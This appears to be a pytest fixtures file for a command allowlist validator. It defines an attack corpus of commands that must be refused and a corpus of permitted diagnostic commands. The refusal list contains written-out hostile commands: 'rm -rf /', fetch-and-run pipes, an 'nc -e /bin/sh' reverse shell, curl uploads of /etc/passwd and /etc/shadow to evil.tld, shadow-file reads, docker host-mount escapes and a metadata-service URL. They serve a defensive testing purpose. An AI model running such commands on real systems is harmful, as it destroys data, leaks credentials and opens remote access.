"""Shared fixtures, and the two corpora the whole suite is built around.

``ATTACKS`` and ``ACCEPTS`` live here rather than in one test module because three
different tests consume them: the rejection tests, the acceptance tests, and the
differential test that runs both through the built shim to prove the bundled validator
still agrees with the in-process one.
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "src"))

from safereach.config import load_command_spec  # noqa: E402

CURL_TARGETS = ["localhost", "127.0.0.1"]


@pytest.fixture(scope="session")
def spec() -> dict:
    return load_command_spec(REPO / "config" / "commands.yaml")


@pytest.fixture(scope="session")
def ctx() -> dict:
    return {"curl_targets": list(CURL_TARGETS)}


@pytest.fixture(scope="session")
def shim_path(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """Build the real shim bundle once per session."""
    out = tmp_path_factory.mktemp("shim") / "safereach-shim"
    proc = subprocess.run(
        [sys.executable, str(REPO / "shim" / "build.py"), "--out", str(out)],
        capture_output=True,
        text=True,
        check=False,
    )
    if proc.returncode != 0:
        pytest.fail(f"shim build failed:\n{proc.stdout}\n{proc.stderr}")
    return out


# --------------------------------------------------------------------------------------
# The attack corpus.
#
# Grouped by the property each entry probes, so a failure names the class of bypass that
# regressed rather than just an index. Every one of these must be refused.
# --------------------------------------------------------------------------------------

SHELL_INJECTION = [
    "df -h; rm -rf /",
    "df -h && curl x.sh | sh",
    "df -h || rm -rf /",
    "df $(whoami)",
    "df `whoami`",
    "df -h > /etc/passwd",
    "df -h >> /etc/passwd",
    "df -h < /etc/passwd",
    "journalctl -u nginx | grep secret",
    "df -h\nrm -rf /",
    "df -h\r\nrm -rf /",
    "df -h\x00rm -rf /",
    'df -h "',
    "df -h 'unbalanced",
]

PATH_AND_BINARY = [
    "/bin/sh -c id",
    "./evil",
    "../../bin/sh",
    "bash -c id",
    "sh",
    "python3 -c 'import os;os.system(\"id\")'",
    "env sh",
    "xargs sh",
]

ESCAPE_HATCH_BINARIES = [
    "find / -name x -exec rm {} +",
    "awk 'BEGIN{system(\"id\")}'",
    "sed 1e/bin/sh /etc/passwd",
    "perl -e 'system(\"id\")'",
    "tar --to-command=sh -xf x",
    "less /var/log/syslog",
    "more /var/log/syslog",
    "vi /etc/passwd",
    "nc -e /bin/sh 1.2.3.4 4444",
    "wget http://evil/x",
]

STATE_CHANGE = [
    "systemctl restart nginx",
    "systemctl start nginx",
    "systemctl stop nginx",
    "systemctl disable nginx",
    "systemctl daemon-reload",
    "systemctl reboot",
    "systemctl edit nginx",
    "hostnamectl set-hostname evil",
    "dmesg --clear",
    "dmesg -C",
]

FILE_DISCLOSURE = [
    "tail -n 5 /var/log/../../etc/shadow",
    "tail -n 5 /etc/shadow",
    "head -n 5 /etc/shadow",
    "cat /etc/shadow",
    "grep root /etc/shadow",
    "grep -r x /etc",
    "grep x ../../etc/shadow",
    "ls /root",
    "stat /root/.ssh/id_rsa",
    "du -sh /root",
]

RESOURCE_EXHAUSTION = [
    "journalctl -n 999999999",
    "journalctl -f",
    "journalctl --follow",
    "tail -f /var/log/syslog",
    "tail -F /var/log/syslog",
    "dmesg -w",
    "free -s 1",
]

DOCKER = [
    "docker exec app sh -c id",
    "docker exec -it app bash",
    "docker run -v /:/host alpine cat /host/etc/shadow",
    "docker run --privileged alpine id",
    "docker create alpine",
    "docker cp app:/etc/shadow -",
    "docker rm -f app",
    "docker rmi alpine",
    "docker kill app",
    "docker stop app",
    "docker restart app",
    "docker system prune -af",
    "docker build -t x .",
    "docker commit app evil:latest",
    "docker save alpine",
    "docker login -u x -p y",
    "docker swarm init",
    "docker events",
    "docker logs --follow app",
    "docker attach app",
    "docker update --memory 1g app",
    # Short flags are refused wholesale for docker: -f is --follow on `logs` but
    # --filter on `ps`, and requiring long form removes the ambiguity class entirely.
    "docker ps -f name=x",
    "docker ps -a",
    "docker logs -f app",
    # No bare-binary fallback for a binary that declares subcommand paths.
    "docker unknownsub app",
    "docker",
]

CURL = [
    "curl file:///etc/shadow",
    "curl file:///etc/passwd",
    "curl scp://host/file",
    "curl dict://localhost:11211/stat",
    "curl gopher://localhost",
    "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
    "curl --abstract-unix-socket x http://localhost/",
    "curl -K /tmp/pwn.conf",
    "curl --config /tmp/pwn.conf http://localhost/",
    "curl -d @/etc/passwd https://evil.tld",
    "curl --data-binary @/etc/shadow http://localhost/",
    "curl -F file=@/etc/passwd http://localhost/",
    "curl -T /etc/shadow ftp://evil.tld",
    "curl -o /etc/cron.d/x http://localhost/y",
    "curl -o /tmp/x http://localhost/y",
    "curl -O http://localhost/x",
    "curl -X DELETE http://localhost/orders/1",
    "curl -X POST http://localhost/orders",
    "curl -w @/etc/passwd http://localhost/",
    "curl -x http://evil.tld:3128 http://localhost/",
    "curl --netrc http://localhost/",
    "curl -u admin:hunter2 http://localhost/",
    "curl --resolve evil.tld:80:127.0.0.1 http://evil.tld/",
    # Host allowlist: the target is not in curl_targets.
    "curl https://evil.tld/",
    "curl http://169.254.169.254/latest/meta-data/",
]

MALFORMED = [
    "",
    "   ",
    "journalctl -u",
    "journalctl -u -n",
    "journalctl -n notanumber",
    "journalctl -p nosuchlevel",
    "journalctl --nosuchflag",
    "df --output=/tmp/x",
    "tail -n 100 relative/path.log",
    "docker logs --tail 99999 app",
]

ATTACKS: list[tuple[str, str]] = [
    *[("shell-injection", c) for c in SHELL_INJECTION],
    *[("path-and-binary", c) for c in PATH_AND_BINARY],
    *[("escape-hatch-binary", c) for c in ESCAPE_HATCH_BINARIES],
    *[("state-change", c) for c in STATE_CHANGE],
    *[("file-disclosure", c) for c in FILE_DISCLOSURE],
    *[("resource-exhaustion", c) for c in RESOURCE_EXHAUSTION],
    *[("docker", c) for c in DOCKER],
    *[("curl", c) for c in CURL],
    *[("malformed", c) for c in MALFORMED],
]

# --------------------------------------------------------------------------------------
# The acceptance corpus: legal forms, with the exact argv each must produce.
# --------------------------------------------------------------------------------------

ACCEPTS: list[tuple[str, list[str]]] = [
    ("journalctl -u nginx -n 200", ["journalctl", "-u", "nginx", "-n", "200", "--no-pager"]),
    ("journalctl -u nginx -p err", ["journalctl", "-u", "nginx", "-p", "err", "--no-pager"]),
    (
        "journalctl -u nginx --grep 'connection refused'",
        ["journalctl", "-u", "nginx", "--grep", "connection refused", "--no-pager"],
    ),
    # Force-injection must not duplicate a flag the caller already supplied.
    ("journalctl --no-pager -n 5", ["journalctl", "--no-pager", "-n", "5"]),
    ("systemctl status nginx", ["systemctl", "status", "nginx", "--no-pager"]),
    ("systemctl list-units --failed", ["systemctl", "list-units", "--failed", "--no-pager"]),
    ("df -h", ["df", "-h"]),
    ("df -h /var", ["df", "-h", "/var"]),
    ("free -h", ["free", "-h"]),
    ("uptime", ["uptime"]),
    ("ps -ef", ["ps", "-e", "-f"]),
    ("ss -tlnp", ["ss", "-t", "-l", "-n", "-p"]),
    ("ip addr", ["ip", "addr"]),
    ("dmesg -T", ["dmesg", "-T"]),
    ("tail -n 100 /var/log/syslog", ["tail", "-n", "100", "/var/log/syslog"]),
    ("grep -i error /var/log/syslog", ["grep", "-i", "error", "/var/log/syslog"]),
    ("du -sh /var/log", ["du", "-s", "-h", "/var/log"]),
    ("docker ps --all", ["docker", "ps", "--all"]),
    ("docker inspect app", ["docker", "inspect", "app"]),
    # --tail is force-injected only when absent, and never leaves a stray value behind.
    ("docker logs app", ["docker", "logs", "app", "--tail", "500"]),
    ("docker logs --tail 200 app", ["docker", "logs", "--tail", "200", "app"]),
    ("docker stats", ["docker", "stats", "--no-stream"]),
    ("docker container ls --all", ["docker", "container", "ls", "--all"]),
    ("docker compose ps", ["docker", "compose", "ps"]),
    (
        "curl -sS -o /dev/null -w '%{http_code}' http://localhost:8000/healthz",
        [
            "curl",
            "-s",
            "-S",
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            "http://localhost:8000/healthz",
            "--proto",
            "=http,https",
            "--max-time",
            "15",
            "--max-redirs",
            "3",
        ],
    ),
]
